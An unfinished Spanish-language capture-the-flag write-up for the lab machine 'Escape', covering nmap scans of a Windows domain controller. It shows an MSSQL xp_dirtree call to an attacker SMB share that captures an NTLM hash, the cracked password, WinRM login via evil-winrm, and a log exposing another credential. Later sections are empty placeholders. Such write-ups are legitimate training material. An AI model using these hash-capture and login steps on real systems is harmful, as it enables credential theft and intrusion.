# Escape

## Tabla de Contenido <!-- omit from toc -->

- [Introducción](#introducción)
  - [Técnicas vistas / Tags](#técnicas-vistas--tags)
  - [Estadísticas](#estadísticas)
- [Reconocimiento](#reconocimiento)
  - [Escaneo de host](#escaneo-de-host)
    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
    - [Escaneo específico](#escaneo-específico)
- [Enumeración](#enumeración)
  - [Servicios](#servicios)
    - [Nombre de servicio - Puerto](#nombre-de-servicio---puerto)
      - [Manual](#manual)
      - [Nombre de herramienta](#nombre-de-herramienta)
- [Explotación](#explotación)
  - [Tipo de explotación](#tipo-de-explotación)
    - [Pasos previos | Preparación](#pasos-previos--preparación)
    - [Ejecución](#ejecución)
- [Post Explotación](#post-explotación)
  - [Enumeración](#enumeración-1)
  - [Escalación de privilegios](#escalación-de-privilegios)
- [Conclusión](#conclusión)
- [Notas adicionales](#notas-adicionales)
- [Referencias](#referencias)


## Introducción

### Técnicas vistas / Tags

- Técnica 1
- Técnica 2
- Técnica 3

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Escape]() |
| OS | Windows / Linux |
| Dificultad oficial | Easy |
| Dificultad de comunidad | ![Dificultad]() |
| Puntos | 20 |
| Creadores | [Creator]() |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
└─$ sudo nmap -sS -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-14 23:50 EDT
Initiating SYN Stealth Scan at 23:50
Scanning 10.10.11.202 [65535 ports]
Discovered open port 53/tcp on 10.10.11.202
Discovered open port 445/tcp on 10.10.11.202
Discovered open port 139/tcp on 10.10.11.202
Discovered open port 135/tcp on 10.10.11.202
Discovered open port 636/tcp on 10.10.11.202
SYN Stealth Scan Timing: About 18.76% done; ETC: 23:53 (0:02:14 remaining)
Discovered open port 464/tcp on 10.10.11.202
Discovered open port 389/tcp on 10.10.11.202
Discovered open port 1433/tcp on 10.10.11.202
SYN Stealth Scan Timing: About 46.53% done; ETC: 23:52 (0:01:10 remaining)
Discovered open port 9389/tcp on 10.10.11.202
Discovered open port 49687/tcp on 10.10.11.202
Discovered open port 49667/tcp on 10.10.11.202
Discovered open port 49685/tcp on 10.10.11.202
Discovered open port 5985/tcp on 10.10.11.202
Discovered open port 49709/tcp on 10.10.11.202
Discovered open port 3269/tcp on 10.10.11.202
Discovered open port 593/tcp on 10.10.11.202
Discovered open port 3268/tcp on 10.10.11.202
Discovered open port 49704/tcp on 10.10.11.202
Discovered open port 88/tcp on 10.10.11.202
Discovered open port 65049/tcp on 10.10.11.202
Completed SYN Stealth Scan at 23:52, 106.59s elapsed (65535 total ports)
Nmap scan report for 10.10.11.202
Host is up (0.073s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49685/tcp open  unknown
49687/tcp open  unknown
49704/tcp open  unknown
49709/tcp open  unknown
65049/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 106.66 seconds
           Raw packets sent: 131125 (5.769MB) | Rcvd: 93 (4.092KB)
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49687,49704,49709,65049 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-15 00:18 EDT
Nmap scan report for 10.10.11.202
Host is up (0.073s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-15 12:18:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-15T12:19:46+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-04-15T12:19:45+00:00; +8h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-04-15T11:50:05
|_Not valid after:  2053-04-15T11:50:05
|_ssl-date: 2023-04-15T12:19:46+00:00; +7h59m59s from scanner time.
| ms-sql-ntlm-info:
|   Target_Name: sequel
|   NetBIOS_Domain_Name: sequel
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: dc.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-15T12:19:46+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-15T12:19:45+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
65049/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.10.11.202:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time:
|   date: 2023-04-15T12:19:09
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.28 seconds
```

## Enumeración

### Servicios

#### Nombre de servicio - Puerto

##### Manual

```bash
SQL> xp_dirtree '\\10.10.14.5\smbFolder'
subdirectory
```

```bash
sql_svc::sequel:aaaaaaaaaaaaaaaa:2a68c844617f03e699f0102c341271f4:010100000000000080f660f35d6fd901a90afcd28f7f354c00000000010010004100660067005000720049004e005400030010004100660067005000720049004e0054000200100050006900720055006b007700510045000400100050006900720055006b007700510045000700080080f660f35d6fd901060004000200000008003000300000000000000000000000003000009cda1e46ee79bae57149ebe478a06f0f35ca523d83fff147be6e50e8a1b524360a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
```

```bash
SQL_SVC::sequel:aaaaaaaaaaaaaaaa:2a68c844617f03e699f0102c341271f4:010100000000000080f660f35d6fd901a90afcd28f7f354c000000000100100041                                                                                                           100660067005000720049004e005400030010004100660067005000720049004e0054000200100050006900720055006b007700510045000400100050006900720055                                                                                                           5006b007700510045000700080080f660f35d6fd901060004000200000008003000300000000000000000000000003000009cda1e46ee79bae57149ebe478a06f0f35                                                                                                           5ca523d83fff147be6e50e8a1b524360a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e                                                                                                           e0035000000000000000000:REGGIE1234ronnie
```

```bash
└─$ crackmapexec winrm 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

```bash
└─$ evil-winrm -i 10.10.11.202  -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

```bash
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
```


##### Nombre de herramienta



## Explotación

### Tipo de explotación

#### Pasos previos | Preparación



#### Ejecución



## Post Explotación

### Enumeración



### Escalación de privilegios


## Conclusión


## Notas adicionales


## Referencias

